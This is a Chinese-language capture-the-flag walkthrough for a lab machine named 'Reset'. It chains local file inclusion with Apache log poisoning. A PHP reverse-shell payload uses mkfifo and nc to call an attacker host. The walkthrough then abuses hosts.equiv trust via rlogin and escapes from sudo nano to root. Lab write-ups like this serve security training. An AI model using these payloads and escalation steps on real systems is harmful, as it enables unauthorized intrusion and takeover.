## Reset

#### 这是一个找不到域名的靶机，不重要！
#### 这是一个password_hash 值为无法通过常规字典（如 rockyou.txt）爆破的强 SHA1的 一个包含弱身份验证机制的 Web 应用靶机，不重要！

![夜深晨早打靶机](images/073101.png)
## buripsuite 的三段拦截 同个页面

### 1. 关于BurpSuite 的 主动利用漏洞的中间人攻击技术流程
![夜深晨早打靶机](images/073102.png)
Web 应用的密码重置功能，在浏览器的开发者工具中 (F12 → Network)获得密码后，登陆 开始拦截
#### [1]获得POST，Ctrl+R,Shift+Ctrl+R 修改file=为/%2Fvar/%2Flog/%2Fapache2/%2Faccess.log  Send，回应有User-Agent字段 ,Forward 
漏洞类型：本地文件包含（LFI）
#### [2]点击同个浏览器页面，获得POST，Ctrl+R,Shift+Ctrl+R 修改User-Agent:为
```
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 主机IP不是目标IP 9090 >/tmp/f'); ?>
```
Send,Forward 
漏洞类型：日志注入（Log Poisoning,攻击载体：User-Agent header 注入 PHP payload
#### [3]点击同个浏览器页面，获得POST，Ctrl+R,Shift+Ctrl+R 修改file=为/%2Fvar/%2Flog/%2Fapache2/%2Faccess.log 
```
nc -lvnp 9090
```
Send  连接上nc 
漏洞类型：命令执行（RCE）,通过 LFI 包含 access.log，实现服务器端 payload 执行

### 2.squite3添加SHA1 
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@reset:/var/www/html$ export TERM=xterm
www-data@reset:/var/www/html$ whoami

www-data@reset:/var/www/html$ ls
dashboard.php index.php private_34eee5d2 reset_password.php
www-data@reset:/var/www/html$ cat /etc/hosts.equiv   //这条蛮重要的
```
![夜深晨早打靶机](images/073103.png)
+sadm 允许所有主机以 sadm 用户身份信任连接（允许免密码 rsh 登录）



3333
```
$ sudo useradd sadm
$ sudo passwd sadm

$ su sadm

$ rlogin sadm@IP
sadm@reset:~$

$ ps aux

$ tmux attach -t sadm_session

$ $ sudo nano /etc/firewall.sh

//一旦我们进入纳米界面，我们可以按Ctrl+r，然后按Ctrl+x，这允许我们执行来自纳米界面的命令。

//进入这个提示符后，应该输入以下命令，以root身份进入系统shell。

reset; bash 1>&0 2>&0

root@reset:/home/sadm# whoami
root
```

